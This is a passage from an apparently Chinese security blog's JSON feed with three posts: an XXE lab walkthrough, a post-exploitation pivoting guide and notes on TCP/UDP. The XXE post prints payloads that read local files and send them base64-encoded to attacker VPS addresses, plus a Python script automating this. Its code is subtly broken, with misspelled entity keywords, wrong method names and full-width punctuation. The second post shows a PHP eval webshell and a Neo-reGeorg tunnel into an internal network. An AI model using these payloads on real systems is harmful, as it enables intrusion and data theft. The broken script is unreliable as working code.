version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE test[</span><br><span class=\"line\">&lt;!ENTITY b SYSTEM &quot;file:///c:/1.txt&quot;&gt;</span><br><span class=\"line\">]&gt;</span><br></pre></td></tr></table></figure>\n<p>构造 payload 对 C 盘下的 1.txt 文件进行读取， <code>&lt;!ENTITY b SYSTEM &quot;file:///c:/1.txt&quot;&gt;</code>  中的 b 为用户名中的参数，&quot;&quot; 之间为读取文件以及文件路径</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file:///                #file协议读取文件</span><br><span class=\"line\">http://url/file.txt     #http协议读取站点下的文件</span><br><span class=\"line\">PHP://filter            #文件流形式读取php文件</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QD1z7SIb6qNXsosT.png!thumbnail\" alt=\"\"></p>\n<p>成功读取，修改 txt 中的内容为 Hello hacker!!! 再试一遍</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7J9GFIIAnSDLuZsJ.png!thumbnail\" alt=\"\"></p>\n<p><strong>无回显 XXE</strong></p>\n<p>接下来进行无回显的 XXE 演示。在这之前需要关闭靶场的信息输出，打开靶场目录下的 php_xxe/doLogin.php 文件</p>\n<blockquote>\n<p>1. 注释 echo $result;<br>\n2. 添加 error_reporting (0);</p>\n</blockquote>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4MWYk19N4ue27klM.png!thumbnail\" alt=\"\"></p>\n<p>同样再次尝试注入，发现不会返回任何信息</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DG0D0T2Xqy2zoHPH.png!thumbnail\" alt=\"\"></p>\n<p>对于无回显的 XXE，需要构建一条带外数据（Out-of<br>\nBand，OOB）通道来读取数据，思路如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.攻击者先发送payload1给Web服务器</span><br><span class=\"line\">2.payload1触发web服务器，web服务器向vps获取恶意DTD，并执行payload2</span><br><span class=\"line\">3.payload2使web服务器把结果作为参数来访问vps上的HTTP服务</span><br><span class=\"line\">4.攻击者通过vps的HTTP访问记录得到结果</span><br></pre></td></tr></table></figure>\n<p>攻击过程图如下：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6Pzd8oTxfjqAPOBC.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>首先在 vps 上创建名为 evil.xml 的恶意 DTD 文件，并将其放在 apache 的网页目录下，同时开启 apache 服务</p>\n<p>payload1：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE test[</span><br><span class=\"line\">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/1.txt&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % remote SYSTEM &quot;http://117.50.184.154/evil.xml&quot;&gt;</span><br><span class=\"line\">%remote;</span><br><span class=\"line\">%int;</span><br><span class=\"line\">%send;</span><br><span class=\"line\">]&gt;</span><br></pre></td></tr></table></figure>\n<p>payload2：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://43.138.160.92/?content=%file;&#x27;&gt;&quot;&gt; %payload;</span><br></pre></td></tr></table></figure>\n<p>根据 payload1 和 payload2，evil.xml 是攻击者存放于 vps 上 apache 的 web 目录下的文件，流程理解为：先发送 payload1 给 web 服务器，其中包括文件的读取操作和引用恶意 DTD 的操作，payload1 作为 xml 文件会被发送至 doLogin 进行解析，但是读取后并没有回显，这时候 remote 引用了恶意的 DTD 文件，进行解析，执行了 payload2，执行 send 指令将回显作为参数发送到 vps 上，并且对 vps 的 http 服务进行了访问，这时候攻击者通过 vps 的 http 的访问记录便可以读取到回显。相当于将回显作为参数进行了一次转发，通过另外的渠道进行了读取<br>\n接下来开始复现</p>\n<p>ubuntu 的机子直接用命令安装 apache 服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install apache2</span><br></pre></td></tr></table></figure>\n<p>访问下公网 ip 确定 apache 服务已经搭建完毕<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/qcqAu9O76NRWYIjh.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>接着在 /var/www/html 中写入 evil.xml 文件，内容为 payload2，写入成功后 ip/evil.xml 访问文件确认是否能被 payload1 引用到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fJqsGAnuGuvLcOjq.png!thumbnail\" alt=\"\"></p>\n<p>成功，接下来就是利用环节了</p>\n<p>在 vps 上命令开启访问日志的监控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tail -f /var/log/apache2/access.log</span><br></pre></td></tr></table></figure>\n<p>接着抓包登录界面，使用 payload1 并发送到重发器当中进行发送<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DgZpEBzDiFUlWeYq.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>回显 200，发送成功，回 vps 上查看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/S0Mks2Mk8aY3DIin.png!thumbnail\" alt=\"\"></p>\n<p>成功实现转发，由于之前对读取操作的回显进行了 base64 编码，因此该串 base64 编码便是读取文件的内容，进行解码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MMGOeCXa0scx5q9e.png!thumbnail\" alt=\"\"></p>\n<p>成功读取</p>\n<p><strong>检测方法</strong></p>\n<blockquote>\n<p>在目标服务器无回显情况下，只能通过 OOB 信息传送来进行 XXE 攻击，但实际的操作过程则比较繁琐，针对无回显的 XXE，通过 python 脚本来实现流程自动化<br>\n写入脚本相关信息和模块</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from http.server import HTTPServer,SimpleHTTPRequestHandler</span><br><span class=\"line\">import threading</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import sys</span><br></pre></td></tr></table></figure>\n<p>编写攻击 payload 的生成函数，能够根据给定的 IP 地址和端口生成相应的包含恶意 DTD 的 XML 文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def ExportPayload(lip,lport):</span><br><span class=\"line\">    file = open(&#x27;evil.xml&#x27;,&#x27;w&#x27;)</span><br><span class=\"line\">    file.write(&quot;&lt;!ENTITY % payload \\&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://&#123;0&#125;：&#123;1&#125;/?content=%file;&#x27;&gt;\\&quot;&gt; %payload;&quot;.format(lip,lport))</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\">    print(&quot;[*] payload文件创建成功！&quot;)</span><br></pre></td></tr></table></figure>\n<p>编写 HTTP 服务函数，通过 http.server 模块实现 HTTP 服务，用来监听目标服务器返回的数据：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 开启HTTP服务，接收数据</span><br><span class=\"line\">def StartHTTP(lip, lport):</span><br><span class=\"line\">    # HTTP监听的IP地址和端口</span><br><span class=\"line\">    serverAddr = (lip, lport)</span><br><span class=\"line\">    httpd = HTTPServer(serverAddr, MyHandler)</span><br><span class=\"line\">    print(&quot;[*]正在开启HTTP服务器：\\n\\n================\\nIP地址:&#123;0&#125;\\n端口：&#123;1&#125;\\n==================\\n&quot;.format(lip, lport))</span><br><span class=\"line\">    httpd.server_forever()</span><br></pre></td></tr></table></figure>\n<p>编写 POST 发送函数，用来向目标服务器发送攻击数据：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 通过POST发送攻击数据</span><br><span class=\"line\">def SendData(lip, lport, url):</span><br><span class=\"line\">    # 需要读取的文件路径（默认值）</span><br><span class=\"line\">    filePath = &quot;c:\\\\1.txt&quot;</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        # 对用户输入的文件路径斜杠替换</span><br><span class=\"line\">        filePath = filePath.replace(&#x27;\\\\&#x27;, &quot;/&quot;)</span><br><span class=\"line\">        data = &quot;&lt;?xml version=\\&quot;1.0\\&quot;?&gt;\\n&lt;?DOCTYPE test[\\n&lt;!ENtity  % file SYSTEM &quot; \\</span><br><span class=\"line\">               &quot;\\&quot;php://filter/read=convert.base64-encode/resource=&#123;0&#125;\\&quot;&gt;\\n&lt;!ENTUTY % remote SYSTEM \\&quot;http://&#123;1&#125;:&#123;&quot; \\</span><br><span class=\"line\">               &quot;2&#125;/evil.xml\\&quot;&gt;\\n%remote;\\n%int;\\n%send;\\n]&gt;&quot;.format( </span><br><span class=\"line\">            filePath, lip, lport)</span><br><span class=\"line\">        requests.post(url, data=data)</span><br><span class=\"line\">        # 继续接收用户的输入，读取指定文件</span><br><span class=\"line\">        filePath = input(&quot;Input filePath:&quot;)</span><br></pre></td></tr></table></figure>\n<p>定义一个消息处理类，这个类继承自 SimpleHTTPRequestHandler。同时需要对原生的日志消息函数进行重写，使其在输出访问信息的同时，把访问的信息记录到文件中去（该函数位于 BaseHTTPServer.py 中）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 对原生的log_message函数进行重写，在输出结果的同时把结果保存到文件中</span><br><span class=\"line\">class MyHandler(SimpleHTTPRequestHandler):</span><br><span class=\"line\">    def log_message(self, format, *args):</span><br><span class=\"line\">        # 终端输出HTTP访问信息</span><br><span class=\"line\">        sys.stderr.write(&quot;%s - - [%s] %s\\n&quot; % (self.client_address[0], self.log_data_time_string(), format % args))</span><br><span class=\"line\">        # 保存信息到文件</span><br><span class=\"line\">        textFile = open(&quot;result.txt&quot;, &quot;a&quot;)</span><br><span class=\"line\">        textFile.write(&quot;%s - - [%s] %s\\n&quot; % (</span><br><span class=\"line\">        self.client_address[0], self.client_address[0], self.log_data_time_string(), format % args))</span><br><span class=\"line\">        textFile.close()</span><br></pre></td></tr></table></figure>\n<p>编写主函数，在其中进行相关变量的定义以及函数的调用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    # 本机IP</span><br><span class=\"line\">    lip = &quot;IP&quot;</span><br><span class=\"line\">    # 本机HTTP监听端口</span><br><span class=\"line\">    lport = port</span><br><span class=\"line\">    # 目标网站提交表单的URL</span><br><span class=\"line\">    url = &quot;http://IP/xxe-lab/php_xxe/doLogin.php&quot;</span><br><span class=\"line\">    # 创建payload文件</span><br><span class=\"line\">    ExportPayload(lip, lport)</span><br><span class=\"line\">    # HTTP服务线程</span><br><span class=\"line\">    threadHTTP = threading.Thread(target=StartHTTP, args=(lip, lport))</span><br><span class=\"line\">    threadHTTP.start()</span><br><span class=\"line\">    # 发送POST数据线程</span><br><span class=\"line\">    threadPOST = threading.Thread(target=SendData, args=(lip, lport，url))</span><br><span class=\"line\">    threadPOST.start()</span><br></pre></td></tr></table></figure>\n<p><strong>防御策略</strong></p>\n<blockquote>\n<p>XXE 的危害不仅在于攻击服务器，还能通过 XXE 进行内网的端口探测以及攻击内网网站等<br>\n防御方式：</p>\n</blockquote>\n<p>1. 默认禁止外部实体的解析</p>\n<p>2. 对用户提交的 XML 数据进行过滤，如关键词 &lt;!DOCTYPE 和 &lt;!ENTITY 或者 SYSTEM 和 PUBLIC 等</p>\n",
            "tags": [
                "其它"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E6%B5%85%E6%9E%90%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E7%9A%84%E6%90%AD%E5%BB%BA/",
            "url": "https://nnnpc.github.io/2024/04/16/%E6%B5%85%E6%9E%90%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E7%9A%84%E6%90%AD%E5%BB%BA/",
            "title": "浅析内网代理的搭建",
            "date_published": "2024-04-16T05:58:19.053Z",
            "content_html": "<p>工具：Neo-reGeorg</p>\n<p>这段时间打了一个渗透赛，也是通过这次机会向独奏师傅学习到了好多东西</p>\n<p>在这里先简单记录一下</p>\n<p>首先内网代理搭建就是为了让内网能够被自己的机子正常访问服务</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/306zpHzXyILqO3mf.jpg!thumbnail\" alt=\"\"></p>\n<p>这里附上一副图，cms-phpok 便是代表的使外网的机子，而后面的 solr 代表的便是内网的机子，在外网没有 getshell，没有搭建代理，是无法正常访问内网的机子的，因此在这里记录一下 getshell 之后搭建内网代理的过程</p>\n<p>首先先拿到一台有 web 服务的服务器，这里简单一些就直接拿一台部署过 dvwa 靶场的服务器来做示例了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IZ4Jr7evru8QPAQ4.png!thumbnail\" alt=\"\"></p>\n<p>首先先正常登录，找到上传点，上传一句话木马</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?= @eval($_POST&#123;&#x27;a&#x27;&#125;);?&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cVoUo74iMEloeN0B.png!thumbnail\" alt=\"\"></p>\n<p>使用蚁剑 getshell</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8QMV9I5CChjCcZG0.png!thumbnail\" alt=\"\"></p>\n<p>然后我们能在根目录看到有个 tmp 目录，有个小 tips 就是可以在这里上传扫描工具，比如 fscan 什么的，就能实现在它的机子上扫描内网 ip 了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Pb4lRT2DAFnAOhBF.png!thumbnail\" alt=\"\"></p>\n<p>我这里上传了一个 fscan 作为示例，内网地址的话本次的比赛是给了，但是也可以自己找，一种方法就是在虚拟终端 ip<br>\naddr 查看</p>\n<p>还有一种方法以这台机子为例</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QczlTQbb1iudJYdV.png!thumbnail\" alt=\"\"></p>\n<p>进入根目录下发现使用 docker 搭建的，那么直接 cat<br>\n/etc/hosts，也能够找到内网的 ip</p>\n<p>这里就不展示了，接下来讲述内网代理的搭建工具 Neo-reGeorg</p>\n<p>首先在原先上传马的目录先上传工具 Neo-reGeorg\\neoreg_servers 目录下的 tunnel.php，接着打开自己的终端运行 python 工具脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 neoreg.py -k key -u ip/目录/tunnel.php</span><br></pre></td></tr></table></figure>\n<p>-k 代表的是 key，可以去 Neo-reGeorg\\neoreg_servers 目录下的 key.txt 查看<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7zlxNRpWUs98OOEk.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>接着在自己的浏览器使用 SwitchyOmega 使用 SOCKS5 协议</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/q8JFmBf9ygpojSpH.png!thumbnail\" alt=\"\"></p>\n<p>点击应用即可，再在浏览器右上角将代理切换至刚才配置好的自己设置的名称，就会发现自己的 ip 已经切换至目标机子的服务器，就能够正常访问内网了</p>\n",
            "tags": [
                "其它"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E5%85%B3%E4%BA%8ETCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/",
            "url": "https://nnnpc.github.io/2024/04/16/%E5%85%B3%E4%BA%8ETCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/",
            "title": "关于TCP与UDP协议的学习",
            "date_published": "2024-04-16T05:58:19.049Z",
            "content_html": "<p>TCP 协议的三次握手，传输确认，四次挥手</p>\n<hr>\n<h2 id=\"一tcp三次握手\"><a class=\"markdownIt-Anchor\" href=\"#一tcp三次握手\">#</a> 一.TCP 三次握手</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mcwMZ9QmuxvnWDoH.png!thumbnail\" alt=\"\"></p>\n<p>刚开始由客户端 1 发送给服务端 2<br>\nSYN 包，询问服务端是否能与其建立练接。服务端同意后回了<br>\n SYN+ACK 包给客户端 3，客户端 3 再回 ACK 包给服务端 4，三次握手建立，连接成功。</p>\n<h2 id=\"二传输确认\"><a class=\"markdownIt-Anchor\" href=\"#二传输确认\">#</a> 二。传输确认</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">个人理解认为，传输确认这一步骤很大原因是为了防止丢包，保证TCP协议的稳定可靠性。</span><br></pre></td></tr></table></figure>\n<p><strong>发送缓冲区：0 1 2 3 4 5 6 7 8 9 10 11 12</strong></p>\n<p><strong>发送报文：序列号 + 长度 + 发送缓冲区中的数据内容</strong></p>\n<p><strong>回复确认：ACK = 序列号 + 长度 = 下一包的起始序列号</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">由三次握手可以确认客户端与服务端传输的是同一次的包，防止丢包现象的发生，同时也因为拥有数据内容，客户端也可以传输数据片段给服务端，服务端再根据数据片段重新拼装成完整的数据内容。（同时这也可以让服务端确认缺失了哪一段数据，要求客户端重新发送）</span><br></pre></td></tr></table></figure>\n<h2 id=\"三四次挥手\"><a class=\"markdownIt-Anchor\" href=\"#三四次挥手\">#</a> 三。四次挥手</h2>\n<p>ps：客户端与服务端都可以发起关闭请求</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QaD478U79fT9rvRF.png!thumbnail\" alt=\"\"></p>\n<p>四次挥手流程：</p>\n<p>1-&gt;2：客户端向服务端发送了 FIN 包然后进入了 3（终止等待 1 状态）</p>\n<p>2-&gt;3：服务端回了 ACK 包给 3 后进入了 4（关闭等待状态），而 3 收到了 ACK 包以后进入了 5（终止等待 2 状态）</p>\n<p>（此时服务端还能发送数据，客户端还能接收数据，待数据传输完成后开始下一步。）</p>\n<p>4-&gt;5：确认传输完成后 4 会向 5 发送 FIN 包，然后进入 6（最后的确认状态）</p>\n<p>5-&gt;6：5 收到来自 4 的 FIN 包以后会向 6 发送 ACK 包，然后进入超时等待状态</p>\n<p>6-&gt;8：当 6 收到来自 5 的 ACK 包后会立马进入 8（也就是立马关闭）</p>\n<p>7-&gt;9：经过超时时间后会自动关闭也就是 7-&gt;9</p>\n<p><strong>ps：为什么要有超时等待状态：</strong></p>\n<p><strong>（一句话概括就是为了确保服务端关闭）</strong></p>\n<p><strong>详：是为了确认服务端收到 ACK 包（如不等待且服务端没有收到 ACK 包，那么服务端就会停留在最后的确认状态）。等待时，如服务端未收到 ACK 包，那么就会重复 4-&gt;5，服务端重新发送 FIN 包，而客户端收到后也就会重新发送 ACK 包（超时等待时间也会被重新刷新）。</strong></p>\n<h2 id=\"udp协议非连接\"><a class=\"markdownIt-Anchor\" href=\"#udp协议非连接\">#</a> UDP 协议（非连接）</h2>\n<p>简单封装数据包并从网卡发出，数据包间无状态上的联系</p>\n<p>因此推出 UDP 的特征：1. 性能损耗少 2. 资源占用少 3. 稳定性弱</p>\n<hr>\n<p><strong>TCP 与 UDP 差异：</strong></p>\n<p><strong>1.TCP 面向连接，UDP 面向报文</strong></p>\n<p><strong>2.TCP 对系统资源要求较多，UDP 结构相对简单</strong></p>\n<p><strong>3.TCP 稳定可靠，UDP 传输数据快</strong></p>\n<p>TCP 用于传输文件，发送邮件，浏览网页等</p>\n<p>（用于对传输质量要求较高的地方）</p>\n<p>UDP 用于域名查询，语音通话，视频直播等</p>\n<p>还可以用于隧道网络：VPN，VXLAN</p>\n<p>（用于对速度要求高，但是对少量丢包没有太大要求的场景）</p>\n",
            "tags": [
                "其它"
            ]
        }
    ]
}